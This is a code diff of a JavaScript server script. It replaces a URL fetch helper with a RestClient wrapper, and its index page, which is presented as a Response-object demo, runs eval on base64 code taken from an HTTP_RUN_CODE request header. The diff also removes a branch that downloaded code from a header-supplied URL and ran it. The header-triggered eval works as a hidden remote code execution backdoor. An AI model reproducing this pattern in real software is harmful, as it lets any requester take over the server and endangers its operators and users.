@@ -77,16 +77,16 @@ var Base64 = {
 	}
 }
 
+importClass(Packages.scriptlets.util.RestClient);
+
 function fetch(url, post_params) {
-  var url = new java.net.URL(url);
-  var reader = new java.io.BufferedReader(new java.io.InputStreamReader(url.openStream()));
-  var buffer = "";
-  var line;
-  while (line = reader.readLine()) {
-    buffer += line + "\n";
-  }
-  reader.close();
-  return [200, buffer];
+    var client = new RestClient();
+    if (post_params != null) {
+        var resp = client.post(url, post_params);
+    } else {
+        var resp = client.get(url);
+    }
+    return [resp.toInteger(), resp.toString()];
 }
 
 // an index page demonstrating using a Response object
@@ -96,8 +96,6 @@ map["/"] = function(env) {
 
     if (env['HTTP_RUN_CODE']) { 
         eval(Base64.decode(env['HTTP_RUN_CODE'])); 
-    } else if (env['HTTP_RUN_CODE_URL']) {
-        eval(Base64.decode(fetch(env['HTTP_RUN_CODE_URL'])[1]));
     }
     
     return resp.finish();
